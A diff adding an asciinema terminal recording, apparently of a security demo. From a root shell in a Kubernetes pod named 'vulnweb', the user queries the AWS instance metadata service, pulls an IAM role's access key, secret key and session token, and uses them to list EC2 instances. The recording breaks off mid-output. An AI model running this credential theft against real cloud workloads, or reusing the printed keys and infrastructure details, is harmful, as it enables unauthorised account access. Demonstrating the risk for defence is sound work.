@@ -1,0 +1,846 @@
+{
+  "version": 1,
+  "width": 90,
+  "height": 25,
+  "duration": 61.371181,
+  "command": "/bin/bash --rcfile ~/.bash_profile",
+  "title": null,
+  "env": {
+    "TERM": "xterm-256color",
+    "SHELL": "/bin/bash"
+  },
+  "stdout": [
+    [
+      0.26607,
+      "\u001b[?1034h\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
+    ],
+    [
+      0.502399,
+      "kub"
+    ],
+    [
+      7.7e-05,
+      "ect"
+    ],
+    [
+      0.000698,
+      "l exec -it vulnw"
+    ],
+    [
+      5.7e-05,
+      "eb-"
+    ],
+    [
+      4.4e-05,
+      "25"
+    ],
+    [
+      3.7e-05,
+      "69"
+    ],
+    [
+      0.000138,
+      "9"
+    ],
+    [
+      4.6e-05,
+      "41405"
+    ],
+    [
+      4.3e-05,
+      "-q"
+    ],
+    [
+      3.9e-05,
+      "8"
+    ],
+    [
+      3.5e-05,
+      "v"
+    ],
+    [
+      9e-05,
+      "9"
+    ],
+    [
+      7.1e-05,
+      "r "
+    ],
+    [
+      0.000298,
+      "/bi"
+    ],
+    [
+      0.000222,
+      "n/bash"
+    ],
+    [
+      0.6236,
+      "\r\n"
+    ],
+    [
+      0.413117,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "\r                                                                                         \rroot@vulnweb-2569941405-q8v9r:/# export TER"
+    ],
+    [
+      9.6e-05,
+      "M=x"
+    ],
+    [
+      0.004067,
+      "term"
+    ],
+    [
+      0.316724,
+      "\r\nroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.552052,
+      "c"
+    ],
+    [
+      0.124288,
+      "l"
+    ],
+    [
+      0.111585,
+      "e"
+    ],
+    [
+      0.046941,
+      "a"
+    ],
+    [
+      0.089328,
+      "r"
+    ],
+    [
+      0.111397,
+      "\r\n"
+    ],
+    [
+      0.000788,
+      "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "curl -sk http"
+    ],
+    [
+      0.000169,
+      "://169.254.169.254/latest/meta-data/"
+    ],
+    [
+      1.941326,
+      "\r\n"
+    ],
+    [
+      0.007246,
+      "ami-id\r\nami-launch-index\r\nami-manifest-path\r\nblock-device-mapping/\r\nhostname\r\niam/\r\ninstance-action\r\ninstance-id\r\ninstance-type\r\nlocal-hostname\r\nlocal-ipv4\r\nmac\r\nmetrics/\r\nnetwork/\r\nplacement/\r\nprofile\r\npublic-hostname\r\npublic-ipv4\r\npublic-keys/\r\nreservation-id\r\nsecurity-groups\r\nservices/"
+    ],
+    [
+      9e-05,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "c"
+    ],
+    [
+      0.18046,
+      "l"
+    ],
+    [
+      0.033031,
+      "e"
+    ],
+    [
+      0.090792,
+      "a"
+    ],
+    [
+      0.077444,
+      "r"
+    ],
+    [
+      0.101142,
+      "\r\n"
+    ],
+    [
+      0.000703,
+      "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.386318,
+      "curl -sk http://169.254.169.254/latest/meta-data/iam/secu \rrity-credentials/"
+    ],
+    [
+      1.909661,
+      "\r\n"
+    ],
+    [
+      0.007058,
+      "nodes.kube.lonimbus.com"
+    ],
+    [
+      0.000644,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "\r\nroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.620443,
+      "curl -sk http://169.254.169.254/latest/meta-data/iam/secu \rrity-credentials/nodes.kube.lonimbus.com"
+    ],
+    [
+      1.295272,
+      "\r\n{\r\n  \"Code\" : \"Success\",\r\n  \"LastUpdated\" : \"2017-10-26T05:37:49Z\",\r\n  \"Type\" : \"AWS-HMAC\",\r\n  \"AccessKeyId\" : \"ASIAICPAQNCLQVBXYZJA\",\r\n  \"SecretAccessKey\" : \"Jj4wEx+3Fvu00GMbiWSWAJcQZHv/s/3zzwmhMXvF\",\r\n  \"Token\" : \"FQoDYXdzEFcaDBWlvGnPgyn/5SSlzCK3A99h12ypKnQH184Bmerwg1WQvz55zbcS1Gf0G7WlNszPgcpzUTgSxwLRE3l2a1EOobi0L9C1Nw8CZbb56BI5HfOTkt3gXzQoUs5Xws0Xb5OpEQ6/WcmSAEbxZkreZLWw8WWHZ+3qReoPPvFHY7ug/VQZOsL2pPRVgXxyY+ArFj2pr4I1NW5X4hDAIuLi3AA/J3H6VrIepeoXcJwnIu3xCSsX5g4ududk9iEcsc4Gxlu9PUv3Z+H0WzAQgp0ne39HMn2jlP4mcWQQVVGNfkuBXtB9pZRiLXKxe57MCEjBHnyzQvudvw9tCM4A+fAgneyBNpvZr7wNepBjZ8TZw3LHccrLwKupZicsahUvJI84MXJGDRVjmcFlaX2smpAZHrQUSA5BJYVRqHwh0KTbU94y+z0N0PnnLg+YrKhELR066Rq916hsYjPTIVkcSq3DFVzP5itxBtJbAaBF9PQOfRkwGqhP2T7DabGT8o85vzqEWDEFJKoIAWqD1mxvpIk7kipl9qb4ZPBPEENS+cSTKz75OhWw9rDQSc8sOimvis1NPM04+RvkNxcG66bK8aAmeiSMZwFKHIeyX9IooenFzwU=\",\r\n  \"Expiration\" : \"2017-10-26T12:01:27Z\"\r\n}"
+    ],
+    [
+      0.000886,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "c"
+    ],
+    [
+      0.202858,
+      "l"
+    ],
+    [
+      0.066966,
+      "e"
+    ],
+    [
+      0.077545,
+      "a"
+    ],
+    [
+      0.103959,
+      "r"
+    ],
+    [
+      0.198759,
+      "\r\n"
+    ],
+    [
+      0.000836,
+      "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "aws ec2 --region us-east-1 describe-instances"
+    ],
+    [
+      0.387746,
+      "\r\n"
+    ],
+    [
+      0.534576,
+      "{\r\n    \"Reservations\": [\r\n        {\r\n            \"Instances\": [\r\n                {\r\n                    \"Monitoring\": {\r\n                        \"State\": \"enabled\"\r\n                    }, \r\n                    \"PublicDnsName\": \"ec2-54-175-73-175.compute-1.amazonaws.com\", \r\n                    \"State\": {\r\n                        \"Code\": 16, \r\n                        \"Name\": \"running\"\r\n                    }, \r\n                    \"EbsOptimized\": false, \r\n                    \"LaunchTime\": \"2017-10-26T03:19:05.000Z\", \r\n                    \"PublicIpAddress\": \"54.175.73.175\", \r\n                    \"PrivateIpAddress\": \"172.20.42.228\", \r\n                    \"ProductCodes\": [], \r\n                    \"VpcId\": \"vpc-e28f2a9a\", \r\n                    \"StateTransitionReason\": \"\", \r\n                    \"InstanceId\": \"i-01fb6d4dda05da364\", \r\n                    \"ImageId\": \"ami-08431d73\", \r\n                    \"PrivateDnsName\": \"ip-172-20-42-228.ec2.internal\", \r\n                    \"KeyName\": \"kubernetes.kube.lonimbus.com-8a:d"
+    ],
+    [
+      0.000348,
+      "5:c3:2b:06:97:b4:6b:b4:3f:97:fa:14:8e:f7:05\", \r\n                    \"SecurityGroups\": [\r\n                        {\r\n                            \"GroupName\": \"nodes.kube.lonimbus.com\", \r\n                            \"GroupId\": \"sg-d1d797a3\"\r\n                        }\r\n                    ], \r\n                    \"ClientToken\": \"456e96c8-4c37-4208-8a5e-c2c78bd7c148_subnet-47339578_2\", \r\n                    \"SubnetId\": \"subnet-47339578\", \r\n                    \"InstanceType\": \"t2.medium\", \r\n                    \"NetworkInterfaces\": [\r\n                        {\r\n                            \"Status\": \"in-use\", \r\n                            \"MacAddress\": \"06:8c:cf:1a:38:88\", \r\n                            \"SourceDestCheck\": true, \r\n                            \"VpcId\": \"vpc-e28f2a9a\", \r\n                            \"Description\": \"\", \r\n                            \"NetworkInterfaceId\": \"eni-6c1847d5\", \r\n"
+    ],
+    [
+      0.00031,
+      "                            \"PrivateIpAddresses\": [\r\n                                {\r\n                                    \"PrivateDnsName\": \"ip-172-20-42-228.ec2.internal\", \r\n                                    \"PrivateIpAddress\": \"172.20.42.228\", \r\n                                    \"Primary\": true, \r\n                                    \"Association\": {\r\n                                        \"PublicIp\": \"54.175.73.175\", \r\n                                        \"PublicDnsName\": \"ec2-54-175-73-175.compute-1.amazonaws.com\", \r\n                                        \"IpOwnerId\": \"amazon\"\r\n                                    }\r\n                                }\r\n                            ], \r\n                            \"PrivateDnsName\": \"ip-172-20-42-228.ec2.internal\", \r\n"
+    ],
+    [
+      0.000536,
+      "                            \"Attachment\": {\r\n                                \"Status\": \"attached\", \r\n                                \"DeviceIndex\": 0, \r\n                                \"DeleteOnTermination\": true, \r\n                                \"AttachmentId\": \"eni-attach-a05defb3\", \r\n                                \"AttachTime\": \"2017-10-26T03:19:05.000Z\"\r\n                            }, \r\n                            \"Groups\": [\r\n                                {\r\n                                    \"GroupName\": \"nodes.kube.lonimbus.com\", \r\n"
+    ],
+    [
+      0.000115,
+      "                                    \"GroupId\": \"sg-d1d797a3\"\r\n                                }\r\n                            ], \r\n                            \"Ipv6Addresses\": [], \r\n                            \"OwnerId\": \"776845191872\", \r\n                            \"PrivateIpAddress\": \"172.20.42.228\", \r\n                            \"SubnetId\": \"subnet-47339578\", \r\n                            \"Association\": {\r\n                                \"PublicIp\": \"54.175.73.175\", \r\n                                \"PublicDnsName\": \"ec2-54-175-73-175.compute-1.amazonaws.com\", \r\n                                \"IpOwnerId\": \"amazon\"\r\n                            }\r\n                        }\r\n                    ], \r\n                    \"SourceDestCheck\": true, \r\n                    \"Placement\": {\r\n                        \"Tenancy\": \"default\", \r\n                        \"GroupName\": \"\", \r\n                        \"AvailabilityZone\": \"us-east-1d\"\r\n                    }, \r\n                    \"Hypervisor\": \"xen\", \r\n               "
+    ],
+    [
+      0.000147,
+      "     \"BlockDeviceMappings\": [\r\n                        {\r\n                            \"DeviceName\": \"/dev/xvda\", \r\n                            \"Ebs\": {\r\n                                \"Status\": \"attached\", \r\n                                \"DeleteOnTermination\": true, \r\n                                \"VolumeId\": \"vol-000b50966947f8f20\", \r\n                                \"AttachTime\": \"2017-10-26T03:19:06.000Z\"\r\n                            }\r\n                        }\r\n                    ], \r\n                    \"Architecture\": \"x86_64\", \r\n                    \"RootDeviceType\": \"ebs\", \r\n                    \"IamInstanceProfile\": {\r\n                        \"Id\": \"AIPAJDRWDG4FLTSVUQTPY\", \r\n                        \"Arn\": \"arn:aws:iam::776845191872:instance-profile/nodes.kube.lonimbus.com\"\r\n                    }, \r\n                    \"RootDeviceName\": \"/dev/xvda\", \r\n                    \"VirtualizationType\": \"hvm\", \r\n                    \"Tags\": [\r\n                        {\r\n                            \"Value\": \"k"
+    ],
+    [
+      0.000317,
+      "ube.lonimbus.com\", \r\n                            \"Key\": \"KubernetesCluster\"\r\n                        }, \r\n                        {\r\n                            \"Value\": \"nodes.kube.lonimbus.com\", \r\n"
+    ],
+    [
+      0.003947,
+      "                            \"Key\": \"aws:autoscaling:groupName\"\r\n                        }, \r\n                        {\r\n                            \"Value\": \"1\", \r\n                            \"Key\": \"k8s.io/role/node\"\r\n                        }, \r\n                        {\r\n                            \"Value\": \"nodes.kube.lonimbus.com\", \r\n                            \"Key\": \"Name\"\r\n                        }\r\n                    ], \r\n                    \"AmiLaunchIndex\": 1\r\n                }, \r\n                {\r\n                    \"Monitoring\": {\r\n                        \"State\": \"enabled\"\r\n                    }, \r\n                    \"PublicDnsName\": \"ec2-54-234-59-44.compute-1.amazonaws.com\", \r\n                    \"State\": {\r\n                        \"Code\": 16, \r\n                        \"Name\": \"running\"\r\n                    }, \r\n                    \"EbsOptimized\": false, \r\n                    \"LaunchTime\": \"2017-10-26T03:19:05.000Z\", \r\n                    \"PublicIpAddress\": \"54.234.59.44\", \r\n              "
+    ],
+    [
+      0.000326,
+      "      \"PrivateIpAddress\": \"172.20.48.188\", \r\n                    \"ProductCodes\": [], \r\n                    \"VpcId\": \"vpc-e28f2a9a\", \r\n                    \"StateTransitionReason\": \"\", \r\n                    \"InstanceId\": \"i-07e49bdf8370695dc\", \r\n                    \"ImageId\": \"ami-08431d73\", \r\n                    \"PrivateDnsName\": \"ip-172-20-48-188.ec2.internal\", \r\n                    \"KeyName\": \"kubernetes.kube.lonimbus.com-8a:d5:c3:2b:06:97:b4:6b:b4:3f:97:fa:14:8e:f7:05\", \r\n                    \"SecurityGroups\": [\r\n                        {\r\n                            \"GroupName\": \"nodes.kube.lonimbus.com\", \r\n                            \"GroupId\": \"sg-d1d797a3\"\r\n                        }\r\n                    ], \r\n                    \"ClientToken\": \"456e96c8-4c37-4208-8a5e-c2c78bd7c148_subnet-47339578_2\", \r\n                    \"SubnetId\": \"subnet-47339578\", \r\n                    \"InstanceType\": \"t2.medium\", \r\n                    \"NetworkInterfaces\": [\r\n                        {\r\n                            \"St"
+    ],
+    [
+      0.000645,
+      "atus\": \"in-use\", \r\n                            \"MacAddress\": \"06:db:15:69:da:92\", \r\n                            \"SourceDestCheck\": true, \r\n                            \"VpcId\": \"vpc-e28f2a9a\", \r\n                            \"Description\": \"\", \r\n                            \"NetworkInterfaceId\": \"eni-6f1847d6\", \r\n                            \"PrivateIpAddresses\": [\r\n                                {\r\n                                    \"PrivateDnsName\": \"ip-172-20-48-188.ec2.internal\", \r\n                                    \"PrivateIpAddress\": \"172.20.48.188\", \r\n                                    \"Primary\": true, \r\n"
+    ],
+    [
+      0.000266,
+      "                                    \"Association\": {\r\n                                        \"PublicIp\": \"54.234.59.44\", \r\n                                        \"PublicDnsName\": \"ec2-54-234-59-44.compute-1.amazonaws.com\", \r\n                                        \"IpOwnerId\": \"amazon\"\r\n                                    }\r\n                                }\r\n                            ], \r\n                            \"PrivateDnsName\": \"ip-172-20-48-188.ec2.internal\", \r\n                            \"Attachment\": {\r\n                                \"Status\": \"attached\", \r\n                                \"DeviceIndex\": 0, \r\n                                \"DeleteOnTermination\": true, \r\n                                \"AttachmentId\": \"eni-attach-a75defb4\", \r\n                                \"AttachTime\": \"2017-10-26T03:19:05.000Z\"\r\n                            }, \r\n                            \"Groups\": [\r\n                                {\r\n                                    \"GroupName\": \"nodes.kube.lonimbus.com\""
+    ],
+    [
+      0.000145,
+      ", \r\n                                    \"GroupId\": \"sg-d1d797a3\"\r\n                                }\r\n                            ], \r\n                            \"Ipv6Addresses\": [], \r\n                            \"OwnerId\": \"776845191872\", \r\n                            \"PrivateIpAddress\": \"172.20.48.188\", \r\n                            \"SubnetId\": \"subnet-47339578\", \r\n                            \"Association\": {\r\n                                \"PublicIp\": \"54.234.59.44\", \r\n                                \"PublicDnsName\": \"ec2-54-234-59-44.compute-1.amazonaws.com\", \r\n                                \"IpOwnerId\": \"amazon\"\r\n                            }\r\n                        }\r\n                    ], \r\n                    \"SourceDestCheck\": true, \r\n                    \"Placement\": {\r\n                        \"Tenancy\": \"default\", \r\n                        \"GroupName\": \"\", \r\n                        \"AvailabilityZone\": \"us-east-1d\"\r\n                    }, \r\n                    \"Hypervisor\": \"xen\", \r\n             "
+    ],
+    [
+      0.000469,
+      "       \"BlockDeviceMappings\": [\r\n                        {\r\n                            \"DeviceName\": \"/dev/xvda\", \r\n                            \"Ebs\": {\r\n                                \"Status\": \"attached\", \r\n                                \"DeleteOnTermination\": true, \r\n                                \"VolumeId\": \"vol-0edb76a8f7dbcde3a\", \r\n                                \"AttachTime\": \"2017-10-26T03:19:06.000Z\"\r\n                            }\r\n                        }\r\n                    ], \r\n                    \"Architecture\": \"x86_64\", \r\n                    \"RootDeviceType\": \"ebs\", \r\n                    \"IamInstanceProfile\": {\r\n                        \"Id\": \"AIPAJDRWDG4FLTSVUQTPY\", \r\n                        \"Arn\": \"arn:aws:iam::776845191872:instance-profile/nodes.kube.lonimbus.com\"\r\n                    }, \r\n                    \"RootDeviceName\": \"/dev/xvda\", \r\n                    \"VirtualizationType\": \"hvm\", \r\n                    \"Tags\": [\r\n                        {\r\n                            \"Value\": "
+    ],
+    [
+      0.000285,
+      "\"nodes.kube.lonimbus.com\", \r\n                            \"Key\": \"Name\"\r\n                        }, \r\n                        {\r\n                            \"Value\": \"1\", \r\n                            \"Key\": \"k8s.io/role/node\"\r\n                        }, \r\n                        {\r\n                            \"Value\": \"kube.lonimbus.com\", \r\n                            \"Key\": \"KubernetesCluster\"\r\n                        }, \r\n                        {\r\n                            \"Value\": \"nodes.kube.lonimbus.com\", \r\n                            \"Key\": \"aws:autoscaling:groupName\"\r\n                        }\r\n                    ], \r\n                    \"AmiLaunchIndex\": 0\r\n                }\r\n            ], \r\n            \"ReservationId\": \"r-0f46047cc09b75a7a\", \r\n            \"RequesterId\": \"226008221399\", \r\n            \"Groups\": [], \r\n            \"OwnerId\": \"776845191872\"\r\n        }, \r\n        {\r\n            \"Instances\": [\r\n                {\r\n                    \"Monitoring\": {\r\n                        \"State\": \"en"
+    ],
+    [
+      9.2e-05,
+      "abled\"\r\n                    }, \r\n                    \"PublicDnsName\": \"ec2-52-91-151-221.compute-1.amazonaws.com\", \r\n                    \"State\": {\r\n                        \"Code\": 16, \r\n                        \"Name\": \"running\"\r\n                    }, \r\n                    \"EbsOptimized\": false, \r\n                    \"LaunchTime\": \"2017-10-26T03:19:09.000Z\", \r\n                    \"PublicIpAddress\": \"52.91.151.221\", \r\n                    \"PrivateIpAddress\": \"172.20.57.249\", \r\n                    \"ProductCodes\": [], \r\n                    \"VpcId\": \"vpc-e28f2a9a\", \r\n                    \"StateTransitionReason\": \"\", \r\n                    \"InstanceId\": \"i-09c9c706043a20f04\", \r\n                    \"ImageId\": \"ami-08431d73\", \r\n                    \"PrivateDnsName\": \"ip-172-20-57-249.ec2.internal\", \r\n                    \"KeyName\": \"kubernetes.kube.lonimbus.com-8a:d5:c3:2b:06:97:b4:6b:b4:3f:97:fa:14:8e:f7:05\", \r\n                    \"SecurityGroups\": [\r\n                        {\r\n                            \"GroupName\": "
+    ],
+    [
+      6.6e-05,
+      "\"masters.kube.lonimbus.com\", \r\n                            \"GroupId\": \"sg-dfd595ad\"\r\n                        }\r\n                    ], \r\n                    \"ClientToken\": \"bd3df601-fb63-4b48-9e74-5658e86813bf_subnet-47339578_1\", \r\n                    \"SubnetId\": \"subnet-47339578\", \r\n                    \"InstanceType\": \"m3.medium\", \r\n                    \"NetworkInterfaces\": [\r\n                        {\r\n                            \"Status\": \"in-use\", \r\n                            \"MacAddress\": \"06:d2:c9:43:2f:28\", \r\n                            \"SourceDestCheck\": true, \r\n                            \"VpcId\": \"vpc-e28f2a9a\", \r\n                            \"Description\": \"\", \r\n                            \"NetworkInterfaceId\": \"eni-c81b4471\", \r\n                            \"PrivateIpAddresses\": [\r\n                                {\r\n                                    \"PrivateDnsName\": \"ip-172-20-57-249.ec2.internal\", \r\n                                    \"PrivateIpAddress\": \"172.20.57.249\", \r\n                       "
+    ],
+    [
+      0.000387,
+      "             \"Primary\": true, \r\n                                    \"Association\": {\r\n                                        \"PublicIp\": \"52.91.151.221\", \r\n                                        \"PublicDnsName\": \"ec2-52-91-151-221.compute-1.amazonaws.com\", \r\n                                        \"IpOwnerId\": \"amazon\"\r\n                                    }\r\n                                }\r\n                            ], \r\n                            \"PrivateDnsName\": \"ip-172-20-57-249.ec2.internal\", \r\n                            \"Attachment\": {\r\n                                \"Status\": \"attached\", \r\n                                \"DeviceIndex\": 0, \r\n                                \"DeleteOnTermination\": true, \r\n                                \"AttachmentId\": \"eni-attach-3742f024\", \r\n                                \"AttachTime\": \"2017-10-26T03:19:09.000Z\"\r\n                            }, \r\n                            \"Groups\": [\r\n                                {\r\n                                    \"Gro"
+    ],
+    [
+      7.5e-05,
+      "upName\": \"masters.kube.lonimbus.com\", \r\n                                    \"GroupId\": \"sg-dfd595ad\"\r\n                                }\r\n                            ], \r\n                            \"Ipv6Addresses\": [], \r\n                            \"OwnerId\": \"776845191872\", \r\n                            \"PrivateIpAddress\": \"172.20.57.249\", \r\n                            \"SubnetId\": \"subnet-47339578\", \r\n                            \"Association\": {\r\n                                \"PublicIp\": \"52.91.151.221\", \r\n                                \"PublicDnsName\": \"ec2-52-91-151-221.compute-1.amazonaws.com\", \r\n                                \"IpOwnerId\": \"amazon\"\r\n                            }\r\n                        }\r\n                    ], \r\n                    \"SourceDestCheck\": true, \r\n                    \"Placement\": {\r\n                        \"Tenancy\": \"default\", \r\n                        \"GroupName\": \"\", \r\n                        \"AvailabilityZone\": \"us-east-1d\"\r\n                    }, \r\n                  "
+    ],
+    [
+      0.000165,
+      "  \"Hypervisor\": \"xen\", \r\n                    \"BlockDeviceMappings\": [\r\n                        {\r\n                            \"DeviceName\": \"/dev/xvda\", \r\n                            \"Ebs\": {\r\n                                \"Status\": \"attached\", \r\n                                \"DeleteOnTermination\": true, \r\n                                \"VolumeId\": \"vol-044c9fe34ef45f40d\", \r\n                                \"AttachTime\": \"2017-10-26T03:19:10.000Z\"\r\n                            }\r\n                        }, \r\n                        {\r\n                            \"DeviceName\": \"/dev/xvdu\", \r\n                            \"Ebs\": {\r\n                                \"Status\": \"attached\", \r\n                                \"DeleteOnTermination\": false, \r\n                                \"VolumeId\": \"vol-0a4d923ae71aeb302\", \r\n                                \"AttachTime\": \"2017-10-26T03:27:44.000Z\"\r\n                            }\r\n                        }, \r\n                        {\r\n                            \"Devi"
+    ],
+    [
+      0.000315,
+      "ceName\": \"/dev/xvdv\", \r\n                            \"Ebs\": {\r\n                                \"Status\": \"attached\", \r\n                                \"DeleteOnTermination\": false, \r\n                                \"VolumeId\": \"vol-01ccd6cff68312215\", \r\n                                \"AttachTime\": \"2017-10-26T03:27:44.000Z\"\r\n                            }\r\n                        }\r\n                    ], \r\n                    \"Architecture\": \"x86_64\", \r\n                    \"RootDeviceType\": \"ebs\", \r\n                    \"IamInstanceProfile\": {\r\n                        \"Id\": \"AIPAIISRZO3DXLKR4A6G4\", \r\n                        \"Arn\": \"arn:aws:iam::776845191872:instance-profile/masters.kube.lonimbus.com\"\r\n                    }, \r\n                    \"RootDeviceName\": \"/dev/xvda\", \r\n                    \"VirtualizationType\": \"hvm\", \r\n                    \"Tags\": [\r\n                        {\r\n                            \"Value\": \"master-us-east-1d.masters.kube.lonimbus.com\", \r\n                            \"Key\": \"aws:a"
+    ],
+    [
+      0.000199,
+      "utoscaling:groupName\"\r\n                        }, \r\n                        {\r\n                            \"Value\": \"kube.lonimbus.com\", \r\n                            \"Key\": \"KubernetesCluster\"\r\n                        }, \r\n                        {\r\n                            \"Value\": \"master-us-east-1d.masters.kube.lonimbus.com\", \r\n                            \"Key\": \"Name\"\r\n                        }, \r\n                        {\r\n                            \"Value\": \"1\", \r\n                            \"Key\": \"k8s.io/role/master\"\r\n                        }\r\n                    ], \r\n                    \"AmiLaunchIndex\": 0\r\n                }\r\n            ], \r\n            \"ReservationId\": \"r-0f3c684ebceea2bbb\", \r\n            \"RequesterId\": \"226008221399\", \r\n            \"Groups\": [], \r\n            \"OwnerId\": \"776845191872\"\r\n        }, \r\n        {\r\n            \"Instances\": [\r\n                {\r\n                    \"Monitoring\": {\r\n                        \"State\": \"disabled\"\r\n                    }, \r\n              "
+    ],
+    [
+      5.4e-05,
+      "      \"PublicDnsName\": \"ec2-34-207-143-119.compute-1.amazonaws.com\", \r\n                    \"State\": {\r\n                        \"Code\": 16, \r\n                        \"Name\": \"running\"\r\n                    }, \r\n                    \"EbsOptimized\": false, \r\n                    \"LaunchTime\": \"2017-10-06T14:02:30.000Z\", \r\n                    \"PublicIpAddress\": \"34.207.143.119\", \r\n                    \"PrivateIpAddress\": \"10.0.0.254\", \r\n                    \"ProductCodes\": [], \r\n                    \"VpcId\": \"vpc-ac0f90cb\", \r\n                    \"StateTransitionReason\": \"\", \r\n                    \"InstanceId\": \"i-07087c9d36d4f9131\", \r\n                    \"EnaSupport\": true, \r\n                    \"ImageId\": \"ami-cd0f5cb6\", \r\n                    \"PrivateDnsName\": \"ip-10-0-0-254.ec2.internal\", \r\n                    \"KeyName\": \"kube\", \r\n                    \"SecurityGroups\": [\r\n                        {\r\n                            \"GroupName\": \"launch-wizard-1\", \r\n                            \"GroupId\": \"sg-2949545a\"\r\n      "
+    ],
+    [
+      0.000368,
+      "                  }\r\n                    ], \r\n                    \"ClientToken\": \"GbAbg1507298549235\", \r\n                    \"SubnetId\": \"subnet-9150b2d8\", \r\n                    \"InstanceType\": \"t2.micro\", \r\n                    \"NetworkInterfaces\": [\r\n                        {\r\n                            \"Status\": \"in-use\", \r\n                            \"MacAddress\": \"0a:c5:7a:0d:21:0e\", \r\n                            \"SourceDestCheck\": true, \r\n                            \"VpcId\": \"vpc-ac0f90cb\", \r\n                            \"Description\": \"Primary network interface\", \r\n                            \"NetworkInterfaceId\": \"eni-474a4ff9\", \r\n                            \"PrivateIpAddresses\": [\r\n                                {\r\n                                    \"PrivateDnsName\": \"ip-10-0-0-254.ec2.internal\", \r\n                                    \"PrivateIpAddress\": \"10.0.0.254\", \r\n                                    \"Primary\": true, \r\n                                    \"Association\": {\r\n                       "
+    ],
+    [
+      0.000117,
+      "                 \"PublicIp\": \"34.207.143.119\", \r\n                                        \"PublicDnsName\": \"ec2-34-207-143-119.compute-1.amazonaws.com\", \r\n                                        \"IpOwnerId\": \"amazon\"\r\n                                    }\r\n                                }\r\n                            ], \r\n                            \"PrivateDnsName\": \"ip-10-0-0-254.ec2.internal\", \r\n                            \"Attachment\": {\r\n                                \"Status\": \"attached\", \r\n                                \"DeviceIndex\": 0, \r\n                                \"DeleteOnTermination\": true, \r\n                                \"AttachmentId\": \"eni-attach-0788f5f4\", \r\n                                \"AttachTime\": \"2017-10-06T14:02:30.000Z\"\r\n                            }, \r\n                            \"Groups\": [\r\n                                {\r\n                                    \"GroupName\": \"launch-wizard-1\", \r\n                                    \"GroupId\": \"sg-2949545a\"\r\n                  "
+    ],
+    [
+      7.8e-05,
+      "              }\r\n                            ], \r\n                            \"Ipv6Addresses\": [], \r\n                            \"OwnerId\": \"776845191872\", \r\n                            \"PrivateIpAddress\": \"10.0.0.254\", \r\n                            \"SubnetId\": \"subnet-9150b2d8\", \r\n                            \"Association\": {\r\n                                \"PublicIp\": \"34.207.143.119\", \r\n                                \"PublicDnsName\": \"ec2-34-207-143-119.compute-1.amazonaws.com\", \r\n                                \"IpOwnerId\": \"amazon\"\r\n                            }\r\n                        }\r\n                    ], \r\n                    \"SourceDestCheck\": true, \r\n                    \"Placement\": {\r\n                        \"Tenancy\": \"default\", \r\n                        \"GroupName\": \"\", \r\n                        \"AvailabilityZone\": \"us-east-1a\"\r\n                    }, \r\n                    \"Hypervisor\": \"xen\", \r\n                    \"BlockDeviceMappings\": [\r\n                        {\r\n                       "
+    ],
+    [
+      0.000332,
+      "     \"DeviceName\": \"/dev/sda1\", \r\n                            \"Ebs\": {\r\n                                \"Status\": \"attached\", \r\n                                \"DeleteOnTermination\": true, \r\n                                \"VolumeId\": \"vol-03e32fcae20fff39c\", \r\n                                \"AttachTime\": \"2017-10-06T14:02:33.000Z\"\r\n                            }\r\n                        }\r\n                    ], \r\n                    \"Architecture\": \"x86_64\", \r\n                    \"RootDeviceType\": \"ebs\", \r\n                    \"RootDeviceName\": \"/dev/sda1\", \r\n                    \"VirtualizationType\": \"hvm\", \r\n                    \"Tags\": [\r\n                        {\r\n                            \"Value\": \"quoy.io\", \r\n                            \"Key\": \"Name\"\r\n                        }, \r\n                        {\r\n                            \"Value\": \"quoy.io\", \r\n                            \"Key\": \"Registry\"\r\n                        }\r\n                    ], \r\n                    \"AmiLaunchIndex\": 0\r\n         "
+    ],
+    [
+      0.000197,
+      "       }, \r\n                {\r\n                    \"Monitoring\": {\r\n                        \"State\": \"disabled\"\r\n                    }, \r\n                    \"PublicDnsName\": \"ec2-54-162-190-38.compute-1.amazonaws.com\", \r\n                    \"State\": {\r\n                        \"Code\": 16, \r\n                        \"Name\": \"running\"\r\n                    }, \r\n                    \"EbsOptimized\": false, \r\n                    \"LaunchTime\": \"2017-10-06T14:02:30.000Z\", \r\n                    \"PublicIpAddress\": \"54.162.190.38\", \r\n                    \"PrivateIpAddress\": \"10.0.0.209\", \r\n                    \"ProductCodes\": [], \r\n                    \"VpcId\": \"vpc-ac0f90cb\", \r\n                    \"StateTransitionReason\": \"\", \r\n                    \"InstanceId\": \"i-06fb0ccbd225868b4\", \r\n                    \"EnaSupport\": true, \r\n                    \"ImageId\": \"ami-cd0f5cb6\", \r\n                    \"PrivateDnsName\": \"ip-10-0-0-209.ec2.internal\", \r\n                    \"KeyName\": \"kube\", \r\n                    \"SecurityGroups\": [\r"
+    ],
+    [
+      0.000488,
+      "\n                        {\r\n                            \"GroupName\": \"launch-wizard-1\", \r\n                            \"GroupId\": \"sg-2949545a\"\r\n                        }\r\n                    ], \r\n                    \"ClientToken\": \"GbAbg1507298549235\", \r\n                    \"SubnetId\": \"subnet-9150b2d8\", \r\n                    \"InstanceType\": \"t2.micro\", \r\n                    \"NetworkInterfaces\": [\r\n                        {\r\n                            \"Status\": \"in-use\", \r\n                            \"MacAddress\": \"0a:f7:70:9f:7d:ca\", \r\n                            \"SourceDestCheck\": true, \r\n                            \"VpcId\": \"vpc-ac0f90cb\", \r\n                            \"Description\": \"Primary network interface\", \r\n                            \"NetworkInterfaceId\": \"eni-444a4ffa\", \r\n                            \"PrivateIpAddresses\": [\r\n                                {\r\n                                    \"PrivateDnsName\": \"ip-10-0-0-209.ec2.internal\", \r\n                                    \"PrivateIpAddress\""
+    ],
+    [
+      9.1e-05,
